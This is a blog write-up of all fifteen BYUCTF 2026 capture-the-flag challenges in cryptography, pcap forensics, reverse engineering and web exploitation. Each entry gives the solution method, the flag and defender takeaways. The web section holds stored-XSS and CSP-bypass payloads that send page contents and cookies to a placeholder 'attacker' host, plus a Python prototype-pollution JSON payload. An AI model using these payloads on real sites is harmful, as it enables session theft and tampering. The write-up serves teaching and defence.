---
title: "BYUCTF 2026 Writeup: All 15 Challenges"
slug: "byuctf-2026-writeup"
description: "BYUCTF 2026 full writeup — crypto, forensics, reverse and web. All 15 challenges solved with methodology, exploit code, and the lessons learned."
date: 2026-05-30T21:00:00Z
lastmod: 2026-05-30T21:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags:
  - "byuctf"
  - "byuctf 2026"
  - "ctf 2026"
  - "cyberjousting"
  - "cryptography"
  - "forensics"
  - "reverse engineering"
  - "web exploitation"
  - "coppersmith"
  - "multi-prime rsa"
  - "yara"
  - "prototype pollution"
  - "stored xss"
  - "pcap analysis"
series: ["BYUCTF 2026"]
keywords:
  - "byuctf 2026 writeup"
  - "byuctf writeup"
  - "byu ctf 2026"
  - "cyberjousting ctf"
  - "byuctf hurtful coppersmith"
  - "byuctf power tower"
  - "byuctf rsa dreams"
  - "byuctf sus-box"
  - "byuctf glados pcap"
  - "byuctf angr management"
  - "byuctf pickle rick"
  - "byuctf rcaas"
  - "byuctf yet another recursive algorithm"
  - "byuctf baby xss"
  - "byuctf kittiessss prototype pollution"
  - "byuctf onpoint csp bypass"
toc: true
cover:
  image: "/images/articles/byuctf-2026-writeup.png"
  alt: "BYUCTF 2026 writeup — all 15 challenges across crypto, forensics, reverse and web"
---

{{< ctf-meta platform="BYUCTF 2026" difficulty="Mixed (Easy → Hard)" os="Jeopardy (Crypto, Forensics, Reverse, Web)" skills="Coppersmith small-roots, multi-prime RSA, Euler totient tower reduction, YARA constraint solving, NTP/ICMP/HTTP pcap forensics, Go reverse engineering, Python prototype pollution, CSP bypass" >}}

**BYUCTF 2026** is Brigham Young University's annual capture-the-flag, hosted on the **Cyber Jousting** infrastructure (`chals.cyberjousting.com`). The 2026 edition runs fifteen challenges across four classic jeopardy categories — Crypto, Forensics, Reverse, and Web — with a heavy *Portal*-flavoured forensics arc starring GLaDOS, Wheatley, and the cake-is-a-lie ICMP/NTP/HTTP capture.

This is the master writeup. Each challenge below covers the bug, the exploit chain, and the recovered flag. Full per-challenge reproductions — solver scripts, lattice constructions, and the Go disassembly — live in the source repository: [Abdelkad3r/byuctf-2026](https://github.com/Abdelkad3r/byuctf-2026).

## The event at a glance

| Category    | Challenge                       | Core technique                                                                          |
|-------------|---------------------------------|-----------------------------------------------------------------------------------------|
| Crypto      | Hurtful                         | `e=3` RSA with a 122-byte known prefix → Howgrave-Graham small-root recovery            |
| Crypto      | Power Tower                     | Multi-prime RSA (25 × 16-bit), 25-deep right-associative exponent tower → Euler-φ recursion |
| Crypto      | RSA Dreams                      | `hint = p + q` ⇒ `φ(n) = n − hint + 1`; one-line decryption                              |
| Crypto      | sus-box                         | 1-round XOR-Sbox-XOR with `k1 = MD5(k0)`; per-position byte brute via XOR of two blocks |
| Forensics   | Alright. Paradox Time           | NTP timestamps' seconds-from-baseline encode ASCII bytes in field order                 |
| Forensics   | Are You Still There?            | ICMP echo payloads carry 4 bytes of flag each                                           |
| Forensics   | Corrupted Cores                 | Spoofed source IPs are printable-ASCII base64; chain across all echoes                  |
| Forensics   | There Will Be Cake              | HTTP `Cookie: cake=<base64>` → base64-decode                                            |
| Reverse     | Angr Management                 | 625-node directed graph; BFS from 0 to 624 reproduces the input sequence                |
| Reverse     | Pickle Rick                     | `rick`/`pickle` → bits → bytes XOR `0x67` → ELF whose `.rodata` has the flag           |
| Reverse     | RCaaS                           | Go SUID service; 30 mod-256 multiplicative equations + 9 fixed positions                |
| Reverse     | Yet Another Recursive Algorithm | YARA rule's `condition` constraints (literal bytes + integer-at-offset asserts)         |
| Web         | baby                            | Stored XSS — `message` rendered raw → admin headless bot leaks `document.body`          |
| Web         | kittiessss                      | Python prototype pollution via `__class__` → `to_dict.__globals__` → `give_flag=True`  |
| Web         | onpoint                         | `onfocus` not blocklisted + template literals + `location =` defeats CSP                |

## Methodology — the reusable framework

Jeopardy challenges don't include a privilege-escalation step the way a HackTheBox machine does. The framework that *does* apply to every BYUCTF challenge is **recon → enumeration → exploitation → flag capture**:

1. **Recon.** Read the handout. The file count, format, and headers are usually the first hint. A 49-packet `.pcapng` with three protocols means the flag is split *across* the protocols, not hiding in one of them. A YARA rule's `condition` is the entire spec.
2. **Enumeration.** Map the constraints. Crypto: write out the equations. Reverse: extract the constants and the comparison targets. Forensics: list the unique signals.
3. **Exploitation.** Invert, solve, or bypass. Most BYUCTF crypto challenges reduce to *recovering a small unknown with a known structural relationship* — Coppersmith for Hurtful, Euler-φ recursion for Power Tower, totient algebra for RSA Dreams.
4. **Flag capture.** Read out the answer. In jeopardy CTFs, "privesc" only applies when there's an OS user boundary to cross — none of the BYUCTF 2026 challenges have one.

{{< callout type="info" title="A pattern across the event" >}}
Most of the BYUCTF 2026 crypto and reverse challenges share one shape: **the secret is small relative to the structure that protects it**. The Hurtful flag is 35 bytes against a 2048-bit modulus. The Power Tower factors are 16 bits. RCaaS's flag is 46 bytes recovered byte-by-byte from 30 small equations. Once you recognise the asymmetry, the attack is a library function.
{{< /callout >}}

---

## Cryptography

### Hurtful — Coppersmith on a 122-byte known prefix

The handout encrypts `"Congrats on making it all the way here. … just find the flag: " + flag` under `e = 3`, 2048-bit `N`. The flag is short (~35 bytes), but the **122-byte prefix is fixed and known**:

```text
ct  =  P · 256^L + x          (P known, x = flag, L = len(flag))
f(x) = (P · 256^L + x)^3 − c  has a small root x_0 over Z_N
```

With `log₂(X) ≈ 280` (the flag bound) versus `log₂(N^{1/3}) ≈ 682`, the root sits well below the Coppersmith bound — a 13×13 lattice (`m=4, t=1`) recovers it after one LLL pass.

```text
byuctf{cuz_st3r30typ3s_hurt_92de04}
```

**Defender takeaway:** `e=3` plus *any* structural relationship between plaintexts (known prefix, known relation between two messages, polynomially-related messages) collapses to Coppersmith. Use OAEP, or at minimum `e=65537`. The flag's wording — *"cuz stereotypes hurt"* — is the lesson, painted on the door.

### Power Tower — reducing a 25-deep exponent tower with Euler's φ

The live server uses multi-prime RSA where `n = ∏ p_i` of 25 primes, each ≤ 2¹⁶, with a 25-deep right-associative power-tower exponent:

```text
E = 73 ^ (6 ^ (11 ^ (90 ^ ... ^ 84)))
c = m^E mod n
```

Factoring `n` is trial division up to 2¹⁶ — milliseconds. The problem becomes computing `E mod (p_i − 1)` per prime, since by CRT:

```text
m mod p_i = c ^ (E^-1 mod (p_i − 1))  mod p_i
```

The Euler-lifting identity reduces a tower modulo `m`:

```text
a^b mod m = a^((b mod φ(m)) + φ(m)) mod m    (when b ≥ log₂ m)
```

Reduce the tower's inner exponent mod `φ(m)`, the next inner mod `φ(φ(m))`, and so on. Every `φ(...)` is cheap because the modulus is bounded by 16 bits at the top and *shrinks* through every nested `φ`. 25 levels × 25 primes ⇒ ~600 trivial φ computations, 50 ms wall-clock — well inside the server's 1-second timeout.

```text
byuctf{eulers_phi_phunction_is_a_phun_phunction}
```

**Defender takeaway:** multi-prime RSA with small primes is broken. If you're publishing a power-tower-shaped exponent and expecting the structure to be a fence, remember it's also a *lifting target* — every nested φ shrinks the modulus you have to reduce against.

### RSA Dreams — `hint = p + q` is `φ(n)` in one subtraction

The handout publishes `n`, `e`, `c`, and `hint = p + q`. The algebra is unavoidable:

```text
φ(n) = (p−1)(q−1) = pq − (p+q) + 1 = n − hint + 1
```

Compute `d = e⁻¹ mod φ`, then `m = c^d mod n`. One line of solver code.

```text
byuctf{great_job_recovering_the_flag}
```

**Defender takeaway:** never publish derivatives of the private key. `p + q`, `p − q`, and `φ(n)` are all equivalent to `d`. Even without the totient shortcut, the same hint factors `n` via `x² − hint·x + n = 0`.

### sus-box — one-round cipher with a brute-forceable k0

The cipher is one round of:

```text
c[j] = S[ p[j] ⊕ k0[j] ] ⊕ k1[j]      where k1 = MD5(k0)
```

The 256-byte S-box is **published in the output**. The plaintext begins with the fixed 37-byte prefix `"I have a secret, please don't share: "`, so blocks 0 and 1 are fully known. XOR two block equations at the same byte position and `k1[j]` cancels:

```text
S[p0[j] ⊕ k0[j]] ⊕ S[p1[j] ⊕ k0[j]]  =  c0[j] ⊕ c1[j]
```

That's a one-byte equation in `k0[j]`. Brute 0..255 per position; verify with `MD5(k0) == k1`. Decrypt the rest of the ciphertext byte-wise:

```text
byuctf{if_you_used_a_llm_youre_missing_out_learning_a_really_cool_attack_!}
```

**Defender takeaway:** the flag itself is the lesson — the attack is XOR-cancel-then-brute, a textbook differential of a single-round substitution cipher. Asking an LLM to solve this without telling it the cancellation trick will produce a wrong answer; the technique is what counts.

---

## Forensics — the GLaDOS pcap

All four forensics challenges share a single 49-packet `GLaDOS_Network.pcapng` carrying NTP, ICMP, and HTTP. Each challenge hides a different flag in a different protocol — and the hints map directly to the protocol that carries it.

### Alright. Paradox Time — NTP timestamps as a byte channel

The hint reads *"what protocol is associated with time?"* — **NTP**. The pcap has 10 NTPv4 client packets to UDP/13337, each carrying four timestamp fields (`reftime`, `org`, `rec`, `xmt`) all in a ~2-minute window of `2089-12-21`. The seconds-from-baseline encodes one ASCII byte per field:

```python
secs = [hh*3600 + mm*60 + ss for ts in timestamps]
base = min(secs)
flag = bytes(s - base for s in secs).rstrip(b"\x00")
```

Reading the fields in `reftime, org, rec, xmt` order across the 10 packets:

```text
byuctf{S0_My_P4r4d0x_!d34_D!dnt_W0rk}
```

The plaintext is Wheatley's line: *"So my paradox idea didn't work."*

**Defender takeaway:** any protocol with a free-form numeric field is a covert channel. NTP timestamps, DNS TTLs, TCP sequence numbers, TLS GREASE values — all have been used in the wild. If your IDS treats NTP as benign, attackers know.

### Are You Still There? — ICMP echo payloads carry the flag

Hint: *"how would you remotely check if a server is online?"* → **ping**. Each ICMP echo request carries 4 bytes of flag in its payload:

```bash
$ tshark -r GLaDOS_Network.pcapng -Y 'icmp.type==8' \
        -T fields -e data.data | xxd -r -p
byuctf{Turr3t_R3d3mpt!0n_L!n3s_4r3_N0t_R!d3s}
```

"Are you still there?" is the iconic turret line from *Portal* — hence the *turret redemption* phrasing.

**Defender takeaway:** ICMP payloads have no protocol-level meaning beyond their length. The default-allow on ICMP echo at most network egress points is the reason loki/ptunnel-style covert channels have been around for 25 years.

### Corrupted Cores — the source IPs *are* the message

Two hints: *"the voices may not belong to a single identity"* + *"the ARP packets are not part of this challenge."* That points at the *senders* of the IP packets — and the ICMP echoes all come from different spoofed IPs:

```text
89.110.108.49   → "Ynl1"
89.51.82.109    → "Y3Rm"
101.49.82.111   → "e1Ro"
77.49.57.81     → "M19Q"
…
100.88.48.65    → "dX0A"
```

Every octet is a printable ASCII byte. Chain them in echo order and base64-decode:

```text
Ynl1Y3Rme1RoM19QNHJ0X1doM3IzX0gzX0shbGxzX1kwdX0A
  → byuctf{Th3_P4rt_Wh3r3_H3_K!lls_Y0u}
```

*"The part where he kills you"* is Wheatley's boss fight — the moment corrupted cores actually matter.

**Defender takeaway:** if you're alerting on spoofed-source ICMP, alert on the *content* of the source addresses too. Long runs of printable-ASCII octets in `ip.src` are not random and not benign.

### There Will Be Cake — `Cookie: cake=<base64>`

Hint: *"a baked treat similar to a cake that you can find on almost any website."* → **HTTP cookies**. One HTTP request in the pcap, one cookie value:

```python
>>> base64.b64decode("Ynl1Y3Rme1RoM19DNGszXyFzXzRfTCEzX0hUQzU2emVFfQ==").decode()
'byuctf{Th3_C4k3_!s_4_L!3_HTC56zeE}'
```

*"The cake is a lie."*

**Defender takeaway:** HTTP cookies are the original covert channel. Inspect cookie values for base64/hex/uuencode patterns when triaging beaconing traffic.

---

## Reverse Engineering

### Angr Management — a 625-node graph maze (no angr needed)

The remote binary is a directed graph of 625 blocks. Each block prints `"Arrived at N"`, reads an integer, and `jmp`s to whichever neighbour matches. Block 624 (`0x270`) prints the flag.

The challenge title is a feint — `angr` will solve it, but every block has the same shape, so two regexes over `objdump -d` extract the entire graph:

```text
nodeN_head:
    movl   $N, %esi
    leaq   <0xf019>(%rip), %rax        ; "Arrived at %d"
    callq  printf
    callq  get_input
    cmpl   $TARGET_1, -0x4(%rbp)
    je     blockA
    cmpl   $TARGET_2, -0x4(%rbp)
    je     blockB
    …
```

Statically extract the adjacency list, BFS from 0 to 624, replay the integer sequence over the socket:

```text
byuctf{g3t_w1th_th3_c0ntr01_fl0w}
```

**Defender takeaway:** "obscure the control flow" is half a defence. If the dispatch is regular enough to disassemble with two regexes, it's regular enough to BFS.

### Pickle Rick — `rick`/`pickle` → bits → bytes XOR 0x67

The handout is 68 032 tokens of `rick` and `pickle`, exactly `8504 × 8`. Treat `rick = 0`, `pickle = 1`, MSB-first, pack 8 bits per byte. The first byte decodes to `0x18` — not ELF magic. But `0x18 ⊕ 0x7F = 0x67`, and the same XOR applies to every byte:

```python
toks = open("pickled.txt").read().split()
bits = [0 if t == "rick" else 1 for t in toks]
buf  = bytearray()
for i in range(0, len(bits), 8):
    b = 0
    for k in range(8):
        b = (b << 1) | bits[i + k]
    buf.append(b ^ 0x67)
open("pickled.elf", "wb").write(buf)
```

```bash
$ file pickled.elf
pickled.elf: ELF 64-bit LSB executable, statically linked, stripped
$ strings -n 6 pickled.elf | head -1
byuctf{1m_p1ckl3_r1111ck!}
```

**Defender takeaway:** any binary obfuscation that XORs by a single byte is exactly *one entropy check* away from being un-obfuscated. The repeated 0x67 bytes (encoded zero-padding) gave the key away.

### RCaaS — Go service, 30 mod-256 multiplicative equations

The handout is a Go x86-64 binary that installs itself as a `kardianos/service`. On run it reads `/opt/atyourservice/flag.txt` and accepts the flag iff:

1. Starts with `byuctf{`, length exactly 0x2E = 46 bytes.
2. Nine specific positions equal `'3'` (`0x33`).
3. Thirty equations of the form `(flag[i] · flag[j]) & 0xff == C` are satisfied.
4. `flag[33] >= 0x60` and `flag[35] >= 0x60`.

Every equation pins one byte from one known and one unknown. Pin the prefix `byuctf{`, the suffix `}`, and the nine fixed positions; then iterate over the 30 equations, solving each as it becomes a single-unknown brute over printable ASCII. One byte ambiguous at position 20 — pick the one that makes `_b3_` read as English leetspeak:

```text
byuctf{s3rv1c3s_c4n_b3_r3v3rs3_3ng1n33r3d_t00}
```

**Defender takeaway:** the flag is the lesson. *"Services can be reverse-engineered too."* — running as a system service does not buy you anti-RE. The verifier still has to encode the check.

### Yet Another Recursive Algorithm — YARA as a constraint solver

The handout is a single YARA rule. Its `condition` is `all of them and uint32(21)==0x6E347473 and uint16(28)==0x7230 and uint16be(29)==0x725F`. The 17 strings `$a..$q` and the three integer-at-offset asserts together constrain a 39-byte plaintext:

- `$c = /byuctf.{33}/` ⇒ length = **6 + 33 = 39**.
- `$j = /\?{3}\}/` ⇒ ends with **`???}`**.
- `uint32(21) == 0x6E347473` (LE) ⇒ `flag[21..25] = "st4n"`.
- `uint16(28) == 0x7230` (LE) ⇒ `flag[28..30] = "0r"`.
- `uint16be(29) == 0x725F` (BE) ⇒ `flag[29..31] = "r_"`.

Each hex-with-wildcards string `{ 77 ?8 79 }` and XOR-decorated string (`"EY\x05E\x0e" xor` with key `0x31`) pins another 2–4 bytes. Combining all constraints uniquely identifies:

```text
byuctf{why_do3s_yara_st4nd_f0r_th4t???}
```

`YARA` = *"Yet Another Recursive Acronym"* — hence the title.

**Defender takeaway:** YARA's `condition` keyword is a small expression language. As a *forward* tool it matches malware. Used as a *backward* constraint solver, it specifies a plaintext. Anyone who reads YARA rules for a living can write them as challenges.

---

## Web Exploitation

### baby — stored XSS, admin bot, flag in the page itself

A "Support Ticket Portal" accepts `subject` + `message`. The `/tickets` page is cookie-gated and visited periodically by a headless admin bot. The renderer HTML-escapes `subject` but interpolates `message` as raw HTML — classic stored XSS. The flag is hard-coded into the `/tickets` template itself, so the exfil target is `document.body.innerHTML`, not just the cookie:

```html
<!-- POST /submit -->
subject: x
message: <script>fetch("https://attacker/x?b=" + encodeURIComponent(document.body.innerHTML.slice(0,4000)))</script>
```

Within ~10 seconds the webhook fires with the rendered ticket list — and the flag block at the top of `<div class="container">`:

```text
byuctf{s33_1t5_3asy!}
```

**Defender takeaway:** *"HTML-escape user input"* must apply to every interpolation site, not just the ones you remembered. Stored XSS with a privileged headless bot is a 2008 attack that still pwns SaaS apps in 2026.

### kittiessss — Python prototype pollution via `__globals__`

A small Flask cat-maker. The form posts JSON `{name, age, color}` to `/cat`, which `merge(data, Cat())`s the input into a fresh `Cat` instance, then renders. A separate `give_flag = False` module global gates a hidden `flag.html` template:

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))      # ← the foothold
        else:
            setattr(dst, k, v)
```

A `Cat` instance has no `__getitem__`, so dict-valued keys fall into `merge(v, getattr(dst, k))`. The Python introspection chain:

```text
Cat instance  ──__class__──▶  Cat (the class)
Cat class     ──to_dict───▶  <function Cat.to_dict>
function      ──__globals__▶ module globals (a dict)
module dict   ──setitem────▶ give_flag = True
```

The payload:

```json
{
  "name": "x", "age": 1, "color": "black",
  "is_happy": true,
  "__class__": {
    "to_dict": {
      "__globals__": { "give_flag": true }
    }
  }
}
```

After the merge, `give_flag` flips on, `is_happy` is true, the route renders `flag.html`:

```text
byuctf{y0u_m4d3_k1tty_h4ppy}
```

**Defender takeaway:** recursive merge functions that don't blocklist `__class__`, `__bases__`, `__globals__`, `__init__`, `__builtins__` are Python's equivalent of the JS prototype-pollution bug class. Use `dict.update` on a known-good keyspace, or — better — never merge attacker JSON into a live object graph.

### onpoint — `onfocus` + template literals + `location =` bypass CSP

The render page applies a substring blocklist over `content`: `script`, `fetch`, `xmlhttprequest`, plus 25+ common `on*` handlers. It also rejects `'`. CSP is `script-src 'unsafe-inline'; connect-src 'none'; img-src 'none'; object-src 'none'`.

Three holes line up:

1. The blocklist is **missing `onfocus`** (and `onbeforetoggle`, `onmessage`, `onsearch`). `<input autofocus onfocus="...">` fires on render.
2. The `'` ban is bypassed with **template literals** (`` `...${document.cookie}` ``).
3. CSP omits `default-src`, so **top-level navigation** (`location = ...`) is unrestricted — `connect-src 'none'` blocks `fetch` but not `location`.

The payload:

```html
<input autofocus onfocus="location=`https://attacker/x?c=${document.cookie}`">
```

Report the URL to the admin bot; the cookie shows up at your webhook:

```text
flag=byuctf{I_w4s_sur3_th1s_0ne_w4a_b3tt3r...}
```

**Defender takeaway:** blocklists of event handlers are guaranteed to miss the next one HTML adds. CSP without `default-src` leaves top-level navigation wide open. Use `script-src 'self'` plus `default-src 'self'`, escape *every* attribute, and stop interpolating user content into raw HTML.

---

## Lessons learned — what BYUCTF 2026 rewarded

Five patterns recur across the fifteen challenges; they're worth lifting out as a checklist:

1. **Small secret, big structure.** Hurtful's 35-byte flag inside 2048-bit RSA. Power Tower's 16-bit primes. RCaaS's 46 bytes recovered byte-wise from 30 small equations. Recognising the size asymmetry is half the solve.
2. **The hint is the protocol.** All four forensics challenges name the protocol that carries the flag — NTP for the time challenge, ICMP for the *are you still there* challenge, HTTP cookies for the *cake* challenge. Read the hint as an index.
3. **Verifiers fail open at their narrowest check.** The `onfocus` blocklist gap, the `cake=<base64>` cookie hidden in HTTP, the `merge()` function that walks `__globals__`, the YARA `uint32(21)` constraint that pins four flag bytes. Find the smallest seam.
4. **Cryptosystem hints are cryptosystem keys.** Power Tower publishes its multi-prime structure. RSA Dreams publishes `p + q`. Hurtful publishes the 122-byte prefix. None of these are aesthetic — they are the entire attack.
5. **Portal flavour is a tell.** When the forensics arc is themed around GLaDOS, expect the *flavour text* to encode the *protocol hint*. *"Cake"* points at cookies. *"Still there?"* points at ping. *"Paradox time"* points at NTP. The author is writing the SOC analyst's mental shortcut into the challenge.

## Source repository

Every per-challenge writeup includes the solver script, intermediate values, and the disassembly or lattice setup:

**Repo:** [github.com/Abdelkad3r/byuctf-2026](https://github.com/Abdelkad3r/byuctf-2026)

**Platform:** [Cyber Jousting](https://cyberjousting.com/) (`chals.cyberjousting.com`)

If you're building detections from this writeup, the *Defender takeaway* lines translate directly to rules — in particular the printable-ASCII source-IP heuristic from *Corrupted Cores*, the cookie-value entropy check from *There Will Be Cake*, the Python `merge()` keyword denylist from *kittiessss*, and the CSP `default-src` baseline from *onpoint*.

{{< faq >}}
[
  {
    "q": "What is BYUCTF 2026?",
    "a": "BYUCTF 2026 is Brigham Young University's annual capture-the-flag competition, hosted on the Cyber Jousting infrastructure (chals.cyberjousting.com). The 2026 edition runs fifteen jeopardy-style challenges across four categories: Crypto, Forensics, Reverse Engineering, and Web Exploitation."
  },
  {
    "q": "How many challenges does BYUCTF 2026 have?",
    "a": "Fifteen challenges total: four Crypto (Hurtful, Power Tower, RSA Dreams, sus-box), four Forensics (Alright. Paradox Time, Are You Still There?, Corrupted Cores, There Will Be Cake), four Reverse (Angr Management, Pickle Rick, RCaaS, Yet Another Recursive Algorithm), and three Web (baby, kittiessss, onpoint)."
  },
  {
    "q": "Where can I find the full BYUCTF 2026 solver scripts?",
    "a": "The full per-challenge writeups, solver scripts, and lattice constructions live in the source repository at github.com/Abdelkad3r/byuctf-2026. Each challenge has its own directory with a README and standalone solver."
  },
  {
    "q": "How is the BYUCTF Hurtful challenge solved?",
    "a": "Hurtful is e=3 RSA with a 122-byte known plaintext prefix. Write the integer plaintext as ct = P * 256^L + x where P is the known prefix and x is the flag, then f(x) = (P * 256^L + x)^3 − c is a monic cubic over Z_N with a small root. A 13x13 Howgrave-Graham / Coppersmith lattice with m=4, t=1 recovers the root in one LLL pass."
  },
  {
    "q": "What is the trick to solving BYUCTF Power Tower?",
    "a": "Multi-prime RSA with 25 factors each up to 2^16 is trial-divisible in milliseconds. The hard part is the 25-deep right-associative exponent tower. Use Euler's lifting identity a^b mod m = a^((b mod φ(m)) + φ(m)) mod m recursively. Each nested φ shrinks the modulus, so reducing the tower modulo (p-1) for each small prime is about 25 cheap φ computations per prime."
  },
  {
    "q": "How are all four BYUCTF GLaDOS forensics flags hidden?",
    "a": "All four forensics challenges share one 49-packet pcapng. Alright. Paradox Time hides bytes in NTP timestamps' seconds-from-baseline. Are You Still There? puts 4 bytes per ICMP echo payload. Corrupted Cores writes the base64-encoded flag across the spoofed source IPs of those same echoes. There Will Be Cake stores the base64 flag in an HTTP Cookie: cake=<base64> header."
  },
  {
    "q": "What is the BYUCTF kittiessss prototype-pollution payload?",
    "a": "The merge function walks getattr-based attributes recursively. A Cat instance's __class__ resolves to the Cat class, whose to_dict method is a function whose __globals__ attribute is the application module dict. Sending a JSON body with __class__.to_dict.__globals__ = {give_flag: true} flips the global flag, after which the route renders flag.html."
  },
  {
    "q": "How does onpoint bypass CSP in BYUCTF 2026?",
    "a": "Three gaps stack. The substring blocklist over content misses onfocus (and onbeforetoggle, onmessage, onsearch). The single-quote ban is sidestepped with backtick template literals. The CSP omits default-src, so connect-src 'none' blocks fetch() but top-level navigation via location = '...' is unrestricted. The payload is <input autofocus onfocus=\"location=`...?c=${document.cookie}`\">."
  },
  {
    "q": "Is BYUCTF 2026 beginner-friendly?",
    "a": "Mixed. RSA Dreams, baby, There Will Be Cake, and Are You Still There? are beginner-friendly and teach concrete techniques. The crypto and reverse tracks ramp quickly — Hurtful needs Coppersmith / Howgrave-Graham lattice intuition, Power Tower assumes comfort with Euler-φ recursion, kittiessss requires Python introspection chaining, and onpoint demands a working mental model of CSP directives. Start with the four easy challenges, then graduate."
  },
  {
    "q": "What platform hosts BYUCTF?",
    "a": "BYUCTF runs on the Cyber Jousting infrastructure at chals.cyberjousting.com. Cyber Jousting is BYU Cyberia's CTF platform used for both BYUCTF and other BYU-hosted events."
  }
]
{{< /faq >}}
